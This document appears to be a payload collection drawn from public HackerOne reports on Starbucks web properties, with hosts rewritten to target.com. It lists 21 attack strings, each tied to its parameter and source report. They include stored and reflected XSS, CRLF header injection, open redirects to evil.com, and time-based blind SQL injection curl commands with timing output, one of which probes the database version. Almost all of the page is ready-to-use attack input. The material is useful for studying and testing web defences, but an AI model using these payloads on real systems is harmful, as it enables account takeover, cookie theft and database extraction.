# Starbucks

21 payloads.

### `112c3043`

```
Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=███████&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.Verific
```

**Parameter:** `Address.FirstName`
— [Stored XSS in Adress Book (target.com/account/profile)](https://hackerone.com/reports/186554) · Starbucks · [myst404](https://hackerone.com/myst404)

### `97d4ff73`

```
http://target.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192667) · Starbucks · [bobrov](https://hackerone.com/bobrov)

### `d86cdea0`

```
http://target.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192667) · Starbucks · [bobrov](https://hackerone.com/bobrov)

### `7d3e1e63`

```
http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192749) · Starbucks · [bobrov](https://hackerone.com/bobrov)

### `8aa23bc4`

```
http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192749) · Starbucks · [bobrov](https://hackerone.com/bobrov)

### `22ebf837`

```
https://target.com/<>javascript:alert(document.cookie);
https://evil.com/<>javascript:alert(document.cookie);
https://evil2.com/<>javascript:alert(document.cookie);
https://target.com/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>javascript:alert('xss parameter');
https://target.com/coffee/coffee,de_DE,sc.html?prefn1=<>javascript:alert('xss parameter');
```

— [Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / target.com)](https://hackerone.com/reports/196846) · Starbucks · [inhibitor181](https://hackerone.com/inhibitor181)

### `d7e71900`

```
<>javascript:alert(document.cookie);
```

— [Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / target.com)](https://hackerone.com/reports/196846) · Starbucks · [inhibitor181](https://hackerone.com/inhibitor181)

### `bf7979dc`

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://target.com

real	0m4.945s
user	0m0.000s
sys		0m0.063s
```

**Parameter:** `group_id`
— [Time-based Blind SQLi on target.com](https://hackerone.com/reports/198292) · Starbucks · [toctou](https://hackerone.com/toctou)

### `3d730aa9`

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://target.com

real	0m0.860s
user	0m0.000s
sys		0m0.031s
```

**Parameter:** `group_id`
— [Time-based Blind SQLi on target.com](https://hackerone.com/reports/198292) · Starbucks · [toctou](https://hackerone.com/toctou)

### `2a8d23ee`

```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://target.com

real	0m4.945s

time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://target.com

real	0m1.005s
```

**Parameter:** `group_id`
— [Time-based Blind SQLi on target.com](https://hackerone.com/reports/198292) · Starbucks · [toctou](https://hackerone.com/toctou)

### `759703b9`

```
http://target.com/%0a<body
```

**Parameter:** `siteBaseUrl`
— [Reflected XSS in target.com /searchasyoutype/v1/search?x-api-key=](https://hackerone.com/reports/213190) · Starbucks · [an0n-j](https://hackerone.com/an0n-j)

### `a2c52f4f`

```
http://target.com/%0a<script
```

**Parameter:** `siteBaseUrl`
— [Reflected XSS in target.com /searchasyoutype/v1/search?x-api-key=](https://hackerone.com/reports/213190) · Starbucks · [an0n-j](https://hackerone.com/an0n-j)

### `9be75863`

```
https://target.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://evil.com/%0a<body
```

**Parameter:** `siteBaseUrl`
— [Reflected XSS in target.com /searchasyoutype/v1/search?x-api-key=](https://hackerone.com/reports/213190) · Starbucks · [an0n-j](https://hackerone.com/an0n-j)

### `fd044ef6`

```
<script></script>
```

**Parameter:** `author`
— [Stored XSS in comments on https://target.com/blog/*](https://hackerone.com/reports/218226) · Starbucks · [bayotop](https://hackerone.com/bayotop)

### `d7dce9b3`

```
https://target.com/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain
```

— [XSS on https://target.com (can lead to credit card theft) (/shop/paymentmethod)](https://hackerone.com/reports/227486) · Starbucks · [bayotop](https://hackerone.com/bayotop)

### `942d02de`

```
https://target.com/#<img/src=
```

— [DOM-based XSS in target.com on IE 11](https://hackerone.com/reports/241619) · Starbucks · [albinowax](https://hackerone.com/albinowax)

### `bc050eff`

```
https://target.com/shop/paymentmethod/hkjhk%2522onclick=%2522confirm(/-/g+this.ownerDocument.domain
```

**Parameter:** `path`
— [Reflected XSS on https://target.com/shop/paymentmethod/ (bypass for 227486)](https://hackerone.com/reports/252908) · Starbucks · [bayotop](https://hackerone.com/bayotop)

### `5d382894`

```
https://target.com/login/login.do?redirect_url=//evil.com
```

**Parameter:** `redirect_url`
— [Open Redirection in Login - Korean Starbucks](https://hackerone.com/reports/380939) · Starbucks · [jtjisgod](https://hackerone.com/jtjisgod)

### `283c383c`

```
https://target.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529
```

**Parameter:** `ReturnUrl`
— [Reflected Cross site Scripting (XSS) on target.com](https://hackerone.com/reports/438240) · Starbucks · [cujanovic](https://hackerone.com/cujanovic)

### `347e1762`

```
https://target.com/account/signin?ReturnUrl=%09Jav%09ascript:alert(document.domain
```

**Parameter:** `ReturnUrl`
— [DOM XSS on target.com via ReturnUrl](https://hackerone.com/reports/526265) · Starbucks · [gamer7112](https://hackerone.com/gamer7112)

### `309bdc36`

```
<link rel="canonical" href="https://target.com/htp8bi2zcg" accesskey="x" onclick="confirm`1`" 2injectiontrme47nbfq="" blonde="" bright-sky-blend="" ground="1&quot;">
```

— [Reflected cross-site scripting on multiple Starbucks assets.](https://hackerone.com/reports/629745) · Starbucks · [stealthy](https://hackerone.com/stealthy)
